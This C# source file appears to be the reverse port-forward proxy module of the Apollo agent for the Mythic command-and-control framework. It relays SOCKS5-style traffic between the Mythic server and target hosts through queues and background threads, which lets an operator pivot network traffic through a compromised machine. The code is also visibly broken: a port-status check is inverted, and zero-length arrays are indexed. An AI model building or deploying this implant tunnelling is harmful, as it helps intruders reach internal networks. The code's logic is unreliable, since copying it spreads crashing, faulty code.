#undef THREADING
#define THREADING

using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.RPortFwdProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;

namespace Apollo.RPortFwdProxy
{
    namespace Structs
    {
        public struct AuthContext
        {
            public int Method;
            public Dictionary<string, string> Payload;
        }

        public struct AddrSpec
        {
            public string FQDN;
            public IPAddress IP;
            public int Port;
        }

        public struct Request
        {
            public int Version;
            public int Command;
            public AuthContext AuthContext;
            public AddrSpec RemoteAddr;
            public AddrSpec DestAddr;
            //public ProxyConnection BufCon; // not right - needs revision
        }
    }
    namespace Enums
    {

        internal enum AddressType : uint
        {
            IPv4Address = 1,
            FQDNAddress = 3,
            IPV6Address = 4
        }
    }


    static class RPortFwdController
    {

        public static bool IsActive(string port)
        {
            if (proxyConnectionMap.ContainsKey(port))
            {
                return false;
            }
            return true;
        }

        public static bool is_dispatcher_active = false;
        public static bool is_retriever_active = false;


        public static Thread dispatcher;

        public static Dictionary<string, ProxyConnection> proxyConnectionMap = new Dictionary<string, ProxyConnection>();

        public static Queue messageQueue = new Queue();
        public static Queue messageQueueSendBack = new Queue();

        private static bool exited = true;

        private static Queue sendToMythicQueue = new Queue();
        private static Queue syncSendToMythicQueue = Queue.Synchronized(sendToMythicQueue);

        private static Queue mythicServerDatagramQueue = new Queue();
        private static Queue syncMythicServerDatagramQueue = Queue.Synchronized(mythicServerDatagramQueue);

        public static Random rnd = new Random();
        public static string CONN_HOST = "mythic";
        public static int CONN_PORT = 3334;
        public static string CONN_TYPE = "tcp";
        public static int MESSAGE_SIZE = 512000;
        public static int MAX_MESSAGES = 500;
        public static int CONN_RECONNECT = 1000; // ms
        public static byte[] DisconnectMessageBytes = BitConverter.GetBytes(-1);

        public const int ConnectCommand = 1;
        public const int NoAuth = 0;
        public const int socks5Version = 5;
        public static IPAddress localhostIPAddr { get; } = IPAddress.Parse("127.0.0.1");


        private static Thread ReadFromMythicThread = null;
        private static Thread WriteToMythicThread = null;


        public static Dictionary<string, Dictionary<string, Socket>> connections = new Dictionary<string, Dictionary<string, Socket>>();

        public static string ListPortForward()
        {
            string listport = "";
            foreach (KeyValuePair<string, ProxyConnection> entry in proxyConnectionMap)
            {
                listport += entry.Value.GetConfs() +"\n";
            }
            return listport;
        }

        public static bool StopClientPort(string port)
        {
            if (IsActive(port))
            {
                try
                {
                    lock (proxyConnectionMap)
                    {
                        proxyConnectionMap[port].StopForward();
                        proxyConnectionMap.Remove(port);
                    }
                    return true;
                }catch (Exception ex)
                {
                    return false;
                }
            }
            return false;
        }

        private static void ClearAllQueues()
        {
            ClearSendToMythicQueue();
            ClearDatagramQueue();
        }


        private static void ClearDatagramQueue()
        {
            syncMythicServerDatagramQueue.Clear();
            ////DebugWriteLine("Releasing mythicServerDatagramMutex.");
        }

        private static void ClearSendToMythicQueue()
        {
            syncSendToMythicQueue.Clear();
            ////DebugWriteLine("Releasing sendToMythicQueueMutex.");
        }

        public static void StartClientPort(string port, string rport, string rip)
        {
            if (is_dispatcher_active == false)
            {
                new Thread(() => DispatchDatagram()).Start();
                is_dispatcher_active = true;
            }

            //if the dispatcher function thread is not running, start the function
            //the dispatcher function should keep reading the queue and sending the results
            //to each ProxyConnection object existent in the dictionary map
            ProxyConnection conn = new ProxyConnection(port, rport, rip);
            proxyConnectionMap[port] = conn;
            // A ProxyConnection object is declared for each port,
            // this object may have multiple connections for the same port

            // the dispatcher thread will keep sending data
            // to ProxyConnection object. In case a connection is not already established, create the connection

            // this func will receive a ProxyConnection after successful connection from operator
            // add this object to dictionary map of portforward

            // RetrieveDatagram will get Data back to mythic
            if (is_retriever_active == false)
            {
                new Thread(() => RetrieveDatagram()).Start();
                is_retriever_active = true;
            }

            // DispatchDatagram will read general queue and send data to each proxy connection
            // start thread to keep adding to general queue messages from that proxyconnection object
        }


        // Function responsible for adding messages to send to
        // the mythic server.
        public static void AddMythicMessageToQueue(SocksDatagram msg)
        {
            syncSendToMythicQueue.Enqueue(msg);
            ////DebugWriteLine("Releasing sendToMythicQueueMutex.");
        }

        // Function respponsible for fetching messages from
        // the queue so that they may be sent to the Mythic
        // server.
        public static PortFwdDatagram[] GetMythicMessagesFromQueue()
        {
            PortFwdDatagram[] default_struct;
            //PortFwdDatagram message = new PortFwdDatagram() { s = value, length = value.Length };
            if (exited == false)
            {
                Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>>> message = new Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>>>();

                foreach (KeyValuePair<string, ProxyConnection> entry in proxyConnectionMap)
                {
                    Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>> specDatagram = entry.Value.GetMessagesBack();
                    message[entry.Key] = specDatagram;
                }
                default_struct = new PortFwdDatagram[0];
                default_struct[0] = new PortFwdDatagram() { data = message };
            }
            default_struct = new PortFwdDatagram[0];
            default_struct[0] = new PortFwdDatagram();
            return default_struct;
        }

        //HERE
        public static void AddDatagramToQueue(PortFwdDatagram dg)
        {
            messageQueue.Enqueue(dg);
        }


        private static object[] GetDatagramsFromQueue()
        {
            while (!exited)
            {
                if (syncMythicServerDatagramQueue.Count > 0)
                {
                    lock (syncMythicServerDatagramQueue)
                    {
                        var results = syncMythicServerDatagramQueue.ToArray();
                        syncMythicServerDatagramQueue.Clear();
                        return results;
                    }
                }
            }
            return null;
        }

        public static void SendDisconnect(int serverID)
        {
            var msg = new SocksDatagram()
            {
                server_id = serverID,
                data = Convert.ToBase64String(DisconnectMessageBytes)
            };
            AddMythicMessageToQueue(msg);
        }


        //public static void AwaitConnectionDisconnect(ProxyConnection conn)
        //{
        //    if (conn == null)
        //        return;
        //    conn.ExitEvent.WaitOne();
        //    var msg = new SocksDatagram()
        //    {
        //        server_id = conn.ServerID,
        //        data = Convert.ToBase64String(DisconnectMessageBytes)
        //    };
        //    AddMythicMessageToQueue(msg);
        //}

        //public static void AwaitRemoveConnection(ProxyConnection conn)
        //{
        //    if (conn == null)
        //        return;
        //    conn.ExitEvent.WaitOne();
        //    //DebugWriteLine("Attempting to remove proxy!");
        //    RemoveProxyConnection(conn.ServerID);
        //}


        private static void RetrieveDatagram()
        {
            while (!exited)
            {
                foreach (KeyValuePair<string, ProxyConnection> entry in proxyConnectionMap)
                {
                    entry.Value.ReadFromTarget();
                }
            }
        }

        //this function will dispatch each data to each connection in the ProxyConnection Object
        private static void DispatchDatagram()
        {
            while (!exited)
            {
                if (messageQueue.Count > 0)
                {
                    lock (messageQueue)
                    {
                        PortFwdDatagram curMsg = (PortFwdDatagram)messageQueue.Dequeue();
                        //iterate over dictionary dg
                        //for each localport in dictionary, send the rest to the respective to proxyConnectionMap
                        //data will be processed inside ProxyConnection object
                        foreach(KeyValuePair<string, Dictionary<String, Dictionary<String, Dictionary<String, List<String>>>>> entry in curMsg.data)
                        {
                            if (proxyConnectionMap.ContainsKey(entry.Key))
                            {
                                proxyConnectionMap[entry.Key].AddDatagramToQueueProx(entry.Value);
                            }
                        }
                    }
                }
            }
        }



        public static void SendError(int serverID, SocksError resp = SocksError.HostUnreachable)
        {
            byte[] bytesToSend = CreateFormattedMessage(resp, new Structs.AddrSpec() { FQDN = "", IP = null, Port = -1 });
            var msg = new SocksDatagram()
            {
                server_id = serverID,
                data = Convert.ToBase64String(bytesToSend)
            };
            AddMythicMessageToQueue(msg);
        }

        private static byte[] CreateFormattedMessage(SocksError resp, Structs.AddrSpec addr)
        {
            Enums.AddressType addrType;
            byte[] addrBody;
            UInt16 addrPort;

            byte[] msg;


            if (addr.FQDN == "" && addr.IP == null && addr.Port == -1)
            {
                addrType = Enums.AddressType.IPv4Address;
                addrBody = new byte[4];
                addrPort = 0;
                //return DisconnectMessageBytes;
            }
            else if (addr.FQDN != "")
            {
                addrType = Enums.AddressType.FQDNAddress;
                addrBody = ASCIIEncoding.ASCII.GetBytes(addr.FQDN);
                addrPort = (UInt16)addr.Port;
            }
            else if (addr.IP != null)
            {
                if (addr.IP.AddressFamily == AddressFamily.InterNetwork)
                {
                    addrType = Enums.AddressType.IPv4Address;
                    addrBody = addr.IP.GetAddressBytes();
                    addrPort = (UInt16)addr.Port;
                }
                else if (addr.IP.AddressFamily == AddressFamily.InterNetworkV6)
                {
                    addrType = Enums.AddressType.IPV6Address;
                    addrBody = addr.IP.GetAddressBytes();
                    addrPort = (UInt16)addr.Port;
                }
                else
                {
                    //DebugWriteLine($"Failed to format address: {addr.IP.AddressFamily.ToString()}");
                    return new byte[1];
                }
            }
            else
            {
                //DebugWriteLine($"Failed to format address: {addr}");
                return new byte[1];
            }


            // Format the message
            msg = new byte[6 + addrBody.Length];
            msg[0] = socks5Version;
            msg[1] = BitConverter.GetBytes((uint)resp)[0];
            msg[2] = 0; // reserved
            msg[3] = BitConverter.GetBytes((uint)addrType)[0];
            Array.Copy(addrBody, 0, msg, 4, addrBody.Length);
            msg[msg.Length - 2] = (byte)(addrPort >> 8);
            msg[msg.Length - 1] = (byte)(addrPort & 0xff);

            return msg;

        }
    }
}
